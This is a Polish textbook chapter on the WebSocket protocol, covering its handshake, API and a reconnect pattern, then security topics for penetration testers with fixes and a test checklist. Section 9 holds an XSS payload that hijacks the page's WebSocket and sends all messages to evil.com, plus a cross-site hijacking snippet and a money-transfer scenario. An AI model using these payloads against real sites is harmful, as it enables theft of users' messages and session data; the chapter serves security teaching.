# Rozdział 25: WebSocket

## 1. Czym jest WebSocket

**WebSocket** to protokół sieciowy zapewniający **dwukierunkową, pełnodupleksową komunikację** między klientem a serwerem przez pojedyncze, persystentne połączenie TCP. W odróżnieniu od HTTP (który jest request-response), WebSocket po ustanowieniu połączenia pozwala serwerowi wysyłać dane do klienta **bez żądania** — serwer "pushuje" dane kiedy chce.

Kluczowe cechy:
- Pełny duplex — klient i serwer mogą wysyłać jednocześnie
- Niski overhead — po handshake brak nagłówków HTTP per-message
- Persystentne połączenie — brak kosztów TCP handshake per-request
- Protokół `ws://` (nieszyfrowany) i `wss://` (szyfrowany przez TLS)
- Komunikaty mogą być tekstem (UTF-8) lub binarnie (Blob/ArrayBuffer)

---

## 2. Dlaczego powstał

### Problem: HTTP polling i long-polling

Przed WebSocket real-time komunikacja wymagała obejść:

**Short polling** — klient odpytuje serwer regularnie:
```javascript
setInterval(() => fetch('/api/updates').then(r => r.json()).then(handleUpdate), 1000);
// Wada: dużo requestów, opóźnienie, duże zużycie zasobów
```

**Long polling** — klient czeka na odpowiedź (serwer trzyma połączenie):
```javascript
async function longPoll() {
    const data = await fetch('/api/subscribe').then(r => r.json());
    handleUpdate(data);
    longPoll(); // natychmiast ponów
}
// Wada: komplikacje z timeoutami, jeden kierunek, overhead HTTP
```

**HTTP/1.1 Server-Sent Events** — jednostronne (serwer → klient).

WebSocket (RFC 6455, 2011) rozwiązał to dostarczając pełnodupleksowy, efektywny protokół.

---

## 3. Jak działa

### Handshake — HTTP Upgrade

WebSocket zaczyna się jako HTTP request:

```
→ GET /ws HTTP/1.1
  Host: example.com
  Upgrade: websocket
  Connection: Upgrade
  Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
  Sec-WebSocket-Version: 13

← HTTP/1.1 101 Switching Protocols
  Upgrade: websocket
  Connection: Upgrade
  Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Po `101 Switching Protocols` połączenie HTTP staje się WebSocket — protokoły nie są kompatybilne, HTTP jest "upgradowany".

**Sec-WebSocket-Key / Sec-WebSocket-Accept** — mechanizm weryfikacji że serwer rzeczywiście rozumie WebSocket (zapobiega nieintencjonalnemu handshake z serwerami nieznającymi WS).

### Framing

Po handshake dane są wysyłane jako **frames** (ramki WebSocket), z bardzo małym overhead:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)    |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)  |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+-------------------------------+
```

Klient musi **maskować** dane (bit MASK=1) — serwer nie musi. Zapobiega to atakowi cache poisoning na pośrednie proxy.

### JavaScript API

```javascript
// Tworzenie połączenia
const ws = new WebSocket('wss://api.example.com/ws');

// Events
ws.onopen = () => console.log('Connected, state:', ws.readyState); // 1 = OPEN
ws.onclose = (event) => {
    console.log('Closed:', event.code, event.reason, event.wasClean);
};
ws.onerror = (err) => console.error('WS Error:', err);
ws.onmessage = (event) => {
    // event.data: string | Blob | ArrayBuffer
    if (typeof event.data === 'string') {
        const msg = JSON.parse(event.data);
        handleMessage(msg);
    } else {
        // Binary data
        const buffer = await event.data.arrayBuffer();
        handleBinary(buffer);
    }
};

// Wysyłanie
ws.send('text message');
ws.send(JSON.stringify({ type: 'subscribe', channel: 'prices' }));
ws.send(new ArrayBuffer(8)); // binary
ws.send(new Blob([...])    ); // binary

// Zamknięcie
ws.close(1000, 'Normal closure'); // code, reason
ws.close(1001, 'Going away');

// Stan
ws.readyState; // 0=CONNECTING, 1=OPEN, 2=CLOSING, 3=CLOSED
ws.bufferedAmount; // bajtów w buforze wysyłania
ws.protocol; // negocjowany subprotokół
ws.extensions; // negocjowane rozszerzenia
```

### Close codes (RFC 6455)

| Kod | Znaczenie |
|-----|-----------|
| 1000 | Normal closure |
| 1001 | Going away (strona się ładuje) |
| 1002 | Protocol error |
| 1003 | Unsupported data |
| 1008 | Policy violation |
| 1011 | Internal server error |
| 4000-4999 | Aplikacyjne (custom) |

---

## 4. Co dzieje się wewnętrznie

### TCP i TLS

WebSocket działa nad TCP. `wss://` dodaje TLS (analogicznie jak HTTPS = HTTP + TLS). Połączenie TCP persystuje przez cały czas życia WebSocket.

### Same-Origin Policy a WebSocket

**Ważne:** WebSocket **nie jest objęty Same-Origin Policy**! Przeglądarka nie blokuje WS połączeń cross-origin. Przeglądarka wysyła nagłówek `Origin` w handshake, ale **to serwer** musi sprawdzić czy przyjąć połączenie z danego origin.

Jest to fundamentalna różnica od XHR/Fetch gdzie CORS ogranicza cross-origin requesty po stronie przeglądarki.

### Heartbeat (Ping/Pong)

WebSocket ma wbudowany mechanizm keepalive: serwer może wysłać **Ping frame**, klient automatycznie odpowiada **Pong frame**. W JavaScript ping/pong frames są niewidoczne (obsługiwane przez przeglądarkę automatycznie).

---

## 5. Analogiczny przykład z życia

WebSocket to otwarta linia telefoniczna:

- Normalne HTTP to faks — wysyłasz dokument, dostajesz odpowiedź, linia jest zamykana
- WebSocket to telefon — raz zadzwoniłeś i linia jest otwarta (handshake = wybranie numeru)
- Obie strony mogą mówić kiedy chcą (pełny duplex)
- Rozmowa trwa do momentu rozłączenia (close event)
- `wss://` = szyfrowana rozmowa (jakby przez bezpieczną linię)

---

## 6. Przykład kodu

```javascript
// === Wzorzec: WebSocket z auto-reconnect i heartbeat ===
class ReliableWebSocket {
    constructor(url, options = {}) {
        this.url = url;
        this.reconnectDelay = options.reconnectDelay ?? 3000;
        this.maxReconnects = options.maxReconnects ?? 10;
        this.reconnects = 0;
        this.handlers = {};
        this.ws = null;
        this.pingInterval = null;
        this.connect();
    }
    
    connect() {
        this.ws = new WebSocket(this.url);
        
        this.ws.onopen = () => {
            this.reconnects = 0;
            this.startHeartbeat();
            this.emit('open');
        };
        
        this.ws.onmessage = ({ data }) => {
            const msg = JSON.parse(data);
            if (msg.type === 'pong') return; // heartbeat response
            this.emit('message', msg);
        };
        
        this.ws.onclose = ({ code, reason }) => {
            this.stopHeartbeat();
            this.emit('close', { code, reason });
            if (this.reconnects < this.maxReconnects && code !== 1000) {
                setTimeout(() => this.connect(), this.reconnectDelay * Math.pow(2, this.reconnects));
                this.reconnects++;
            }
        };
        
        this.ws.onerror = (err) => this.emit('error', err);
    }
    
    startHeartbeat() {
        this.pingInterval = setInterval(() => {
            if (this.ws.readyState === WebSocket.OPEN) {
                this.send({ type: 'ping' });
            }
        }, 30000); // ping co 30s
    }
    
    stopHeartbeat() {
        clearInterval(this.pingInterval);
    }
    
    send(data) {
        if (this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify(data));
        }
    }
    
    on(event, handler) {
        this.handlers[event] = handler;
    }
    
    emit(event, data) {
        this.handlers[event]?.(data);
    }
    
    close() {
        this.maxReconnects = 0; // zapobiega reconnect
        this.ws.close(1000, 'Normal closure');
    }
}

// Użycie:
const ws = new ReliableWebSocket('wss://api.example.com/ws');
ws.on('open', () => ws.send({ type: 'auth', token: getAuthToken() }));
ws.on('message', handleServerMessage);
ws.on('error', handleError);
```

---

## 7. Przykład z prawdziwej aplikacji

### WebSocket w Burp Suite — przechwytywanie i modyfikacja

Burp Suite obsługuje WebSocket natively:

1. **Proxy → WebSockets history** — wszystkie WS wiadomości
2. Można przechwycić, modyfikować i forwardować
3. Repeater obsługuje WebSocket — wyślij custom wiadomości
4. Można nagrywać sesje i replayer

```
Przykładowa sesja w Burp WebSocket Repeater:
→ {"type":"auth","token":"eyJhbGciOiJIUzI1NiJ9..."}
← {"type":"auth_ok","userId":42,"role":"user"}

→ {"type":"getBalance","userId":42}
← {"type":"balance","amount":1000}

# Test: zmień userId na inny (IDOR)
→ {"type":"getBalance","userId":1}
← {"type":"balance","amount":99999}   ← IDOR!
```

### Podatność: brak autentykacji po handshake

```javascript
// Serwer (Node.js + ws library):
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
    // BŁĄD: sprawdza cookie tylko przy handshake
    // ale nie autentykuje każdej wiadomości!
    const isAuth = checkCookie(req.headers.cookie);
    if (!isAuth) { ws.close(1008, 'Unauthorized'); return; }
    
    ws.on('message', (data) => {
        const msg = JSON.parse(data);
        // PODATNOŚĆ: zakłada że jeśli połączony → zaufany
        // Ale sesja mogła wygasnąć po handshake!
        processAdminCommand(msg); // Unauthorized access!
    });
});
```

---

## 8. Typowe błędy programistów

### Błąd 1: Brak weryfikacji Origin w serwerze

```javascript
// SERWER — BŁĄD: przyjmuje połączenia z dowolnego origin
const wss = new WebSocket.Server({ port: 8080 });
wss.on('connection', (ws) => {
    // Nie sprawdza ws.upgradeReq.headers.origin!
    handleConnection(ws);
});

// ATAK: evil.com może połączyć się do ws://bank.com:8080
// i wykonywać operacje używając cookies ofiary (CSRF przez WebSocket!)

// POPRAWKA:
wss.on('connection', (ws, req) => {
    const origin = req.headers.origin;
    const ALLOWED = ['https://bank.com', 'https://app.bank.com'];
    if (!ALLOWED.includes(origin)) {
        ws.close(1008, 'Forbidden origin');
        return;
    }
});
```

### Błąd 2: Brak subprotocol validation

```javascript
// BŁĄD: klient może podać dowolny subprotocol
const ws = new WebSocket('wss://api.com/ws', ['json', 'text']);
// Serwer nie waliduje subprotocol → może prowadzić do błędnego parsowania

// POPRAWKA na serwerze:
const ALLOWED_PROTOCOLS = ['json-v1', 'json-v2'];
server.on('connection', (ws, req) => {
    const protocol = req.headers['sec-websocket-protocol'];
    if (!ALLOWED_PROTOCOLS.includes(protocol)) ws.close();
});
```

### Błąd 3: ws:// zamiast wss://

```javascript
// BŁĄD: nieszyfrowane połączenie
const ws = new WebSocket('ws://api.example.com/ws');
// MITM może podglądać i modyfikować wiadomości!

// POPRAWKA: zawsze wss://
const ws = new WebSocket('wss://api.example.com/ws');
```

---

## 9. Znaczenie dla bezpieczeństwa

### Cross-Site WebSocket Hijacking (CSWSH)

WebSocket nie jest objęty SOP — przeglądarka wysyła cookies do `wss://bank.com` nawet z evil.com. Jeśli serwer nie weryfikuje `Origin` header → atakujący może nawiązać połączenie WS z danymi uwierzytelnienia ofiary:

```javascript
// evil.com:
const ws = new WebSocket('wss://bank.com/ws');
// Przeglądarka wysyła cookies ofiary automatycznie!
ws.onopen = () => ws.send(JSON.stringify({ action: 'getBalance' }));
ws.onmessage = ({ data }) => exfiltrate(data);
```

**Obrona:** serwer musi weryfikować `Origin` header. SameSite=Strict cookie ogranicza to (nie wysyła cookies w cross-site context).

### XSS → WebSocket interception

Jeśli aplikacja ma XSS, atakujący może:

```javascript
// XSS payload:
// Przechwyt istniejącego WebSocket
const origWebSocket = window.WebSocket;
window.WebSocket = function(url, protocols) {
    const ws = new origWebSocket(url, protocols);
    
    const origSend = ws.send.bind(ws);
    ws.send = function(data) {
        // Loguj wysyłane wiadomości
        fetch('https://evil.com/ws-out?d=' + btoa(data), { mode: 'no-cors' });
        return origSend(data);
    };
    
    ws.addEventListener('message', ({ data }) => {
        // Loguj odbierane wiadomości
        fetch('https://evil.com/ws-in?d=' + btoa(data), { mode: 'no-cors' });
    });
    
    return ws;
};
```

### WebSocket i CSRF

Klasyczna ochrona CSRF (token w formularzu) nie działa dla WebSocket. Po połączeniu każda wiadomość nie ma CSRF tokenu (chyba że implementowana aplikacyjnie).

Obrona: weryfikacja Origin + SameSite cookies.

### Injection przez WebSocket

WebSocket messages są często JSON ale mogą prowadzić do:
- **SQL Injection** — jeśli serwer parsuje JSON do SQL bez sanityzacji
- **Command Injection** — jeśli server-side przetwarza dane jako shell commands
- **Server-Side Template Injection** — jeśli dane trafiają do szablonów

### Powiązane CWE

- **CWE-346** — Origin Validation Error (brak Origin check)
- **CWE-79** — XSS (wektor interception WS)
- **CWE-89** — SQL Injection (przez WS messages)
- **CWE-319** — Cleartext Transmission (ws:// zamiast wss://)

---

## 10. Jak identyfikować podczas pentestu

### Burp Suite — WebSocket history

1. **Proxy** → **WebSockets history** — wszystkie WS wiadomości
2. Kliknij prawym → **Send to Repeater** — możesz wysyłać custom messages
3. **Intercept** → możesz przechwycić i modyfikować messages in-flight

### DevTools — Network Tab

1. **Network** → filtruj po `WS` (WebSocket)
2. Kliknij połączenie → zakładka **Messages** — pełna historia wiadomości
3. Wiadomości z `↑` (klient) i `↓` (serwer) są kolorowane różnie

### Testowanie w konsoli

```javascript
// Utwórz nowe połączenie WebSocket (jeśli znasz URL)
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
    // Wyślij bez autentykacji i sprawdź odpowiedź
    ws.send(JSON.stringify({ action: 'listUsers' }));
};
ws.onmessage = ({ data }) => console.log('Response:', data);

// Sprawdź active connections na stronie:
// (Szukaj WebSocket w Network tab przed testowaniem)
```

### Co szukać

- **Origin header** w WS handshake — czy serwer go weryfikuje?
- Czy można połączyć z innego origin (cross-origin)?
- IDOR w wiadomościach (zmień userId/resourceId)
- Brak autentykacji per-message (tylko po handshake)
- Injection w payloadach JSON
- Sensitive data w plaintekst (`ws://` zamiast `wss://`)

---

## 11. Jak testować bezpieczeństwo

```
□ Czy serwer weryfikuje Origin header przy WS handshake?
□ Czy używane jest wss:// (nie ws://)?
□ Czy autentykacja jest per-message czy tylko po połączeniu?
□ Czy jest IDOR w polach userId/resourceId wiadomości?
□ Czy injection (SQL, command) jest możliwy przez WS messages?
□ Czy SameSite=Strict/Lax cookies chronią przed CSWSH?
□ Czy można replay WS messages (brak nonce/timestamp)?
□ Czy rate limiting jest implementowane na WS endpoint?
□ Czy wiadomości są walidowane schematycznie (schema validation)?
□ Czy subprotocol jest walidowany przez serwer?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz 1: Cross-Site WebSocket Hijacking

```
1. Ofiara zalogowana na bank.com
2. Odwiedza evil.com (przez phishing)
3. evil.com wykonuje:
   const ws = new WebSocket('wss://bank.com/ws');
   // Przeglądarka wysyła cookie sesji ofiary!
4. Serwer nie weryfikuje Origin → akceptuje połączenie
5. evil.com wysyła: {"action": "transferMoney", "to": "evil", "amount": 1000}
6. Bank przetwarza jako autentykowany request ofiary
```

### Scenariusz 2: WebSocket IDOR

```
WS message: {"action": "getMessages", "conversationId": 42}
← {"messages": [...prywatne wiadomości użytkownika 1...]}

Zmiana: {"action": "getMessages", "conversationId": 43}
← {"messages": [...prywatne wiadomości użytkownika 2...]}
→ IDOR!
```

---

## 13. Jak się zabezpieczać

```javascript
// Serwer (Node.js):

// 1. Weryfikuj Origin
const ALLOWED_ORIGINS = ['https://app.example.com'];
wss.on('connection', (ws, req) => {
    if (!ALLOWED_ORIGINS.includes(req.headers.origin)) {
        ws.close(1008, 'Forbidden');
        return;
    }
});

// 2. Autentykacja przy każdym połączeniu (nie tylko cookie)
// Opcja A: token w URL (ale URL logowany!)
// wss://api.com/ws?token=xyz

// Opcja B: token w pierwszej wiadomości (lepiej)
wss.on('connection', (ws) => {
    let authenticated = false;
    
    ws.on('message', async (data) => {
        const msg = JSON.parse(data);
        
        if (!authenticated) {
            if (msg.type !== 'AUTH' || !await validateToken(msg.token)) {
                ws.close(1008, 'Unauthorized');
                return;
            }
            authenticated = true;
            return;
        }
        
        // Teraz obsługuj inne wiadomości
        handleMessage(ws, msg);
    });
    
    // Timeout jeśli brak autentykacji w 10s
    setTimeout(() => {
        if (!authenticated) ws.close(1008, 'Auth timeout');
    }, 10000);
});

// 3. Używaj wss:// (TLS)
// 4. Rate limiting per connection
// 5. Schema validation dla wiadomości
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. WebSocket = pełnodupleksowa, persystentna komunikacja TCP (upgrade z HTTP)
2. **Nie objęty Same-Origin Policy** — serwer musi sprawdzić Origin header!
3. Przeglądarka automatycznie wysyła cookies do WS — możliwy CSWSH
4. Brak wbudowanego CSRF protection — implementować aplikacyjnie
5. Główne zagrożenia: CSWSH, IDOR, injection, brak per-message auth

**Dla pentestera:**
- Proxy → WebSockets history w Burp — podstawowe narzędzie
- Sprawdź Origin header w WS handshake response
- Testuj IDOR w każdym polu identyfikującym zasób
- Spróbuj połączyć z innego origin (cross-site)

---

## Powiązania

```
WebSocket
    │
    ├──► Server-Sent Events (Rozdział 26)
    │         SSE = jednostronne (serwer → klient), prostsze, przez HTTP
    │
    ├──► Fetch API (Rozdział 11)
    │         WebSocket = upgrade z HTTP, Fetch = standardowe HTTP
    │
    ├──► CORS (Rozdział 13)
    │         CORS nie dotyczy WS — serwer sam weryfikuje Origin
    │
    └──► Cookies (Rozdział 14)
              SameSite=Strict chroni przed CSWSH
```
